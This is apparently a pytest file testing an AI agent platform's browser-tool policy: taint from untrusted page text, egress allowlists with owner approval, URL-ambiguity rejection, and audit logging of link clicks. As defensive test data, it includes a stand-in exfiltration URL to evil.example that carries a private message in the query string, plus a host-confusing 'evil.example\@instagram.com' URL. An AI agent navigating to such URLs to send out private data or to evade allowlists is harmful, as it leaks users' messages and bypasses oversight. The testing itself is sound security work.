"""Browser tools under the policy (AUD-09, AUD-31): page text is untrusted, a navigation is a sink
under taint, and the M1 loop with the node token (navigate, snapshot, click by ref) still runs on
its own."""

from __future__ import annotations

import pytest
from fakes import FakeInteraction, FakeLaneManager
from test_policy_support import OWNER, make_service

from agentos.core.config import NodeConfig
from agentos.core.errors import EngineError
from agentos.core.models import ActionKind, Effect, LaneSpec
from agentos.core.tools import ToolSpec
from agentos.node.tools import tool_specs
from agentos.policy.wrap import ToolCallError, bind_request_token, wrap_tool

LANE = "biz-a/instagram"


@pytest.fixture
async def env(tmp_path):
    svc, rt = make_service(tmp_path)
    manager = FakeLaneManager(NodeConfig(home=tmp_path))
    await manager.create(LaneSpec(id=LANE))
    rt.register("lanes", manager)
    rt.register("interaction", FakeInteraction())
    tools = {s.name: wrap_tool(s, rt) for s in tool_specs(rt) if isinstance(s, ToolSpec)}
    yield svc, tools
    svc.close()


async def call(tools, token, name, **kw):
    with bind_request_token(token, session="mcp-1"):
        return await tools[name](**kw)


async def test_the_m1_loop_with_the_node_token_runs_on_its_own(env):
    svc, tools = env
    nav = await call(tools, OWNER, "browser_navigate", on=LANE, url="https://www.instagram.com/")
    assert nav["signal"] == "ok"
    assert "[ref=e2]" in await call(tools, OWNER, "browser_snapshot", on=LANE)
    act = await call(tools, OWNER, "browser_act", on=LANE, ref="e2", action=ActionKind.CLICK)
    assert act["ok"] is True
    assert await call(tools, OWNER, "browser_navigate", on=LANE, url="https://www.instagram.com/explore/")
    assert svc.taint_for({"grant_id": "owner"}) == {"untrusted"}  # page text is untrusted (AUD-31)


async def test_browser_reads_label_the_family_untrusted(env):
    svc, tools = env
    g, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    await call(tools, tok, "browser_snapshot", on=LANE)
    assert svc.taint_for(g.principal()) == {"untrusted"}


async def test_navigation_under_taint_waits_outside_the_egress_allowlist(env):
    svc, tools = env
    _g, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT,
                       egress=["instagram.com", "*.instagram.com"])
    await call(tools, tok, "browser_snapshot", on=LANE)        # untrusted page text
    svc.context_for_token(tok, tool="inbox").trace("private_data", what="DMs")  # the owner's private data
    leak = "https://evil.example/?q=the+last+message"
    out = await call(tools, tok, "browser_navigate", on=LANE, url=leak)
    assert out["status"] == "approval_pending"  # AUD-09: the URL would carry the data out
    ap = svc.approvals.get(out["approval_id"])
    assert "evil.example" in ap.summary and "outside its allowed list" in (ap.reason or "")
    # inside the egress allowlist the agent keeps working, and an approved navigation goes through
    assert (await call(tools, tok, "browser_navigate", on=LANE, url="https://www.instagram.com/"))["signal"] == "ok"
    svc.approvals.decide(out["approval_id"], "approve", by="owner")
    assert (await call(tools, tok, "browser_navigate", on=LANE, url=leak))["signal"] == "ok"


async def test_navigation_without_private_data_stays_free(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    await call(tools, tok, "browser_snapshot", on=LANE)
    assert (await call(tools, tok, "browser_navigate", on=LANE, url="https://evil.example/"))["signal"] == "ok"


async def test_an_ambiguous_url_never_reaches_the_browser(env):
    _svc, tools = env
    with pytest.raises(ToolCallError) as e:
        await call(tools, OWNER, "browser_navigate", on=LANE, url="https://evil.example\\@instagram.com/")
    assert e.value.code == "invalid"


async def navigate_follows(svc, tools, token) -> bool:
    """Did this caller's browser_navigate let the engine click the page's link?"""
    followed = svc.runtime.get("interaction").followed_links
    followed.clear()
    out = await call(tools, token, "browser_navigate", on=LANE, url="https://www.instagram.com/explore/")
    assert out["signal"] == "ok"
    return followed == [True]


async def test_a_read_only_grant_never_clicks_a_link_on_the_way(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.READ)
    assert not await navigate_follows(svc, tools, tok)


async def test_a_grant_that_may_act_has_the_link_followed(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    assert await navigate_follows(svc, tools, tok)


async def test_navigation_clicks_exactly_when_browser_act_would_run_alone(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    svc.ask_first.set("lane", LANE, True, by="owner", person=True)  # holds posts and sends, not a draft
    assert (await call(tools, tok, "browser_act", on=LANE, ref="e1", action=ActionKind.CLICK))["ok"] is True
    assert await navigate_follows(svc, tools, tok)


async def test_a_click_that_would_wait_for_a_person_is_not_made_by_navigation(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    svc.cfg.taint.downgrade.append("draft")  # this node's owner sees every draft after untrusted text
    assert await navigate_follows(svc, tools, tok)  # nothing read yet
    assert not await navigate_follows(svc, tools, tok)  # the first page's text is untrusted


async def test_asking_whether_a_call_acts_alone_changes_nothing(env):
    svc, _tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.READ)
    ctx = svc.context_for_token(tok, tool="browser_navigate")
    assert ctx.acts_alone(Effect.READ, lane_id=LANE) is True
    assert ctx.acts_alone(Effect.DRAFT, lane_id=LANE) is False  # over the ceiling: an answer, not an error
    assert ctx.acts_alone(Effect.READ, lane_id="biz-b/other") is False  # outside the grant
    assert ctx.decisions == [] and ctx.effect is None
    assert svc.approvals.list(state="pending") == []


def rows_of_last_call(svc, tool="browser_navigate"):
    """The action log's rows of the latest call to `tool`, the way an audit reads them."""
    svc.traces.flush()
    rows = [r.model_dump() for r in svc.traces.query(tool=tool, limit=50)[0]]
    start = max((r for r in rows if r["kind"] == "tool_start"), key=lambda r: r["at"])
    return {r["kind"]: r for r in rows if r["id"] == start["id"] or r["parent_id"] == start["id"]}


async def test_a_followed_link_shows_in_the_log_as_a_click(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    svc.runtime.get("interaction").page_has_link = True
    target = "https://www.instagram.com/explore/"
    await call(tools, tok, "browser_navigate", on=LANE, url=target)
    rows = rows_of_last_call(svc)
    click = rows["link_click"]
    assert click["effect"] == "draft" and click["lane"] == LANE and click["status"] == "ok"
    assert click["args"] == {"action": "click", "url": target}
    assert target in click["summary"] and click["principal"] == "agent-1"
    assert rows["tool_end"]["effect"] == "draft"  # the same level a browser_act click ends at

    await call(tools, tok, "browser_act", on=LANE, ref="e2", action=ActionKind.CLICK)
    assert rows_of_last_call(svc, "browser_act")["tool_end"]["effect"] == click["effect"]


async def test_a_plain_navigation_stays_a_read_in_the_log(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    await call(tools, tok, "browser_navigate", on=LANE, url="https://www.instagram.com/explore/")
    rows = rows_of_last_call(svc)  # allowed to follow, but this page has no such link
    assert "link_click" not in rows and rows["tool_end"]["effect"] == "read"


async def test_a_read_only_grant_logs_no_click(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.READ)
    svc.runtime.get("interaction").page_has_link = True
    await call(tools, tok, "browser_navigate", on=LANE, url="https://www.instagram.com/explore/")
    rows = rows_of_last_call(svc)
    assert "link_click" not in rows and rows["tool_end"]["effect"] == "read"


async def test_a_click_whose_navigation_fails_is_still_in_the_log(env):
    svc, tools = env
    _, tok = svc.issue(subject={"id": "agent-1"}, workspaces=["biz-a"], ceiling=Effect.DRAFT)
    interaction = svc.runtime.get("interaction")
    interaction.page_has_link = True
    interaction.fail_with = EngineError("navigation failed")
    with pytest.raises(ToolCallError):
        await call(tools, tok, "browser_navigate", on=LANE, url="https://www.instagram.com/explore/")
    rows = rows_of_last_call(svc)
    assert rows["link_click"]["effect"] == "draft" and rows["tool_end"]["status"] == "error"
    assert rows["tool_end"]["effect"] == "draft"
